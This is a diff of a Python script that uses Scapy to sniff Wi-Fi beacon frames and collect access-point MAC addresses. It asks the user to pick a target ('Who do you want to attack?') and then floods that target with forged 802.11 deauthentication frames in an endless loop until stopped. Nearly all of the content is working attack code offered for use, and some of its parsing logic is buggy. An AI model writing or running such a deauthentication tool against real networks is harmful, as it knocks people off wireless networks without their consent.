@@ -16,6 +16,11 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
 
 
 
+# NSM IMPORTS
+from nsm_utilities import Utilities
+
+
+
 # ETC IMPORTS 
 import threading, os, random, time, pyttsx3
 
@@ -29,6 +34,9 @@ for m in MATH:
 print("\n\n")
 
 
+# USE THIS TO INSTALL LIBARIES IN VENV
+# source .venv/bin/activate
+
 
 # RUN THIS FOR NOW TO BEGIN DEAUTH MODULE
 # sudo ./.venv/bin/python nsm_deauth.py
@@ -39,13 +47,41 @@ class Frame_Snatcher():
 
     macs = []   
     beacons = []
+    num = 1 
 
 
     def __init__(self):
         pass
 
 
-    
+    @classmethod
+    def sniff_for_targets(cls, iface="wlan0", verbose=1, timeout=15):
+        """This method will be used to sniff out mac addresses using the sniff function"""
+
+        # COUNT THE ATTEMPTS
+        tempt = 1   
+
+
+        # LOOP THAT BITCH
+        while True:
+
+            
+            # OUTPUT ATTEMPT
+            console.print(f"Sniff Attempt #{tempt}", style="bold green")
+
+                
+            # SNIFF THAT BITCH
+            sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
+            
+            # APPEND TEMPT
+            tempt += 1
+
+            
+            # KEEP LOOPING UNTIL TRUE
+            if cls.beacons:
+                break
+            
+
     
     @classmethod
     def packet_parser(cls, pkt):
@@ -73,18 +109,267 @@ class Frame_Snatcher():
 
              
 
-            if addr1 not in cls.macs and addr1 != "No":
+            if addr1 not in cls.beacons and addr1 != "No":
+                
 
                 # ADD MAC
-                cls.macs.append(addr1)
+                #cls.beacons[cls.num] = str(addr2)
+                cls.beacons.append(addr2)
+                cls.num += 1
+
+
+                # NOW TO OUTPUT RESULTS
                 console.print(f"[{c2}][+] Found a new mac addr1:[{c4}] {addr1}")
+ 
+
+
+            # BEACON == AP FRAMES ONLY           
+            if addr2 not in cls.beacons and addr2 != "No":
+
+
+                # ADD MAC
+                #cls.beacons[cls.num] = str(addr2)
+                cls.beacons.append(addr2)
+                cls.num += 1
+
+
+                # GET VENDOR
+                vendor = Utilities.get_vendor(mac=addr2)
+
+                if vendor:
+                    text = f"Vendor: {vendor}"
+                
+                else:
+                    text = ""
+
+
+
+                # NOW TO OUTPUT RESULTS
+                console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}  {text}")
+
+
+
+    @classmethod
+    def target_chooser(cls):
+        """In this method the user will choose which target they want to attack"""
+
+       
+        # CREATE VARS
+        data = {}
+        num = 0
+        error = False
+        verbose = False
+
+
+        # CREATE A TABLE AND OUTPUT IT
+        table = Table(title="Targets", style="bold purple", border_style="bold red")
+        table.add_column("Key", style="bold red")
+        table.add_column("MAC Addr", style="bold green")
+        
+
+
+        # LOOP THROUGH RESULTS
+        for mac in cls.beacons:
+
+
+            # APPEND NUMBER
+            num +=1 
+
+            # ADD TO DICT
+            data[num] = mac
+
+
+            # ADD TO TABLE
+            table.add_row(f"{num}", f"{mac}")
+            
+        
+
+        # CREATE VAR
+        keys = num
+
+
+        
+        print('\n\n')
+        console.print(table)
+        print('\n')
+
+
+        
+        
+        # DESTROY ERRORS
+        while True:
+            try:
+                
+                
+                # FOR CLEANER OUTPUT
+                if error:
+                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
+                    error = False 
+
+
+                # USER CHOOSES THERE TARGET
+                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()
+
+                # INT IT 
+                choice = int(choice)
+
+
+
+                if choice in range(1, num) or choice == num:
+                    target = data[choice]
+
+
+                    console.print(f"\n\n[bold red]Target choosen:[yellow] {target}")
+
+                    
+                    # RETURN THE TARGET
+                    return target
+                
+                
+
+                # OUTSIDE OF NUM
+                else:
+                    error = True
+                    
+            
+            
+
+            # DIDNT ENTER A KEY VALUE (INTEGER)
+            except KeyError as e:
+                
+                if verbose:
+                    console.print(e)
+
+
+                error = True
 
             
-            if addr2 not in cls.macs and addr2 != "No":
 
-                # ADD MAC
-                cls.macs.append(addr2)
-                console.print(f"[{c2}][+] Found Mac addr:[{c4}] {addr2}")
+            # DIDNT ENTER A KEY VALUE (INTEGER)
+            except TypeError as e:
+
+                if verbose:
+                    console.print(e)
+
+
+                error = True
+            
+
+        
+            
+            # ELSE
+            except Exception as e:
+
+                if verbose:
+
+                    console.print(f"[bold red]Exception Error:[yellow] {e}")
+
+                
+                if error == False:
+                    error = 1
+                
+                elif error:
+                    error += 1
+                
+
+                # SAFETY CATCH
+                if error == 4:
+
+                    console.print("Alright ur done for", style="bold red")
+                    break
+
+    
+    
+
+    @classmethod
+    def target_attacker(cls, target, client="ff:ff:ff:ff:ff:ff", verbose=True, iface="wlan0", inter=0.1, count=25):
+        """This method will be responsible for attacking the choosen target"""
+
+
+        # COUNT THE AMOUNT OF ERRORS
+        error = 0
+
+        
+        # BEGINNING OF THE END
+        use = 2
+        if use == 1:
+            console.print(f"\n[bold red]Now Launching Attack on:[bold green] {target}\n\n")
+        elif use == 2:
+            console.print(f"\n[bold red]Attacking  ----->  [bold green]{target}[/bold green]  <-----  Attacking\n\n")
+
+        time.sleep(2)
+
+        # LOOP UNTIL CTRL + C
+        while True:
+            try:
+
+
+                
+                # GET REASON FOR BEING KICKED OFF / CHOOSE DIFFERENT ONES IN CASE SOME WORK BETTER THEN OTHERS
+                reasons = random.choice([4,5,7,15])
+
+                # CREATE THE LAYER 2 FRAME
+                frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
+
+
+                # NOW TO SEND THE FRAME
+                sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)
+        
+
+
+            except KeyboardInterrupt as e:
+                console.print(e)
+
+                break
+            
+
+            except Exception as e:
+                console.print(f"[bold red]Exception Error:[yellow] {e}")
+
+
+                if error < 4:
+                    error += 1
+                
+                else:
+                    
+                    console.print("[bold red]Max Amount of Errors Given!")
+                    break
+                
+
+
+
+
+
+    
+    @classmethod
+    def main(cls):
+        """This is where the module will spawn from"""
+
+
+        # CLEAN VARS
+        cls.macs = []
+        cls.beacons = []
+        cls.num = 1
+
+        
+        # SNIFF FOR TARGETS
+        Frame_Snatcher.sniff_for_targets()
+
+
+        # ALLOW THE USER TO CHOOSE THERE TARGET
+        target = Frame_Snatcher.target_chooser()
+
+
+        # NOW TO ATTACK THE TARGET
+        Frame_Snatcher.target_attacker(target=target)      
+
+
+
+
+        # END
+        console.print("\n\nThank you for trying out my program", style="bold red") 
+
+        time.sleep(3)
 
 
 
@@ -113,17 +398,17 @@ class Frame_Snatcher():
 
             
             # KEEP LOOPING UNTIL TRUE
-            if cls.macs:
+            if cls.beacons:
                 break
 
-
+        
         go = 100
 
 
-        if cls.macs:
+        if cls.beacons:
 
             while go >= 0:
-                for mac in cls.macs:
+                for mac in cls.beacons:
 
                 #threading.Thread(target=Deauth_You.death_all, args=("ff:ff:ff:ff:ff:ff", mac), daemon=True).start()
 
@@ -352,7 +637,7 @@ if __name__ == "__main__":
 
 
     if use == 1:
-        Frame_Snatcher.sniffer_scapy()
+        Frame_Snatcher.main()
     
 
 
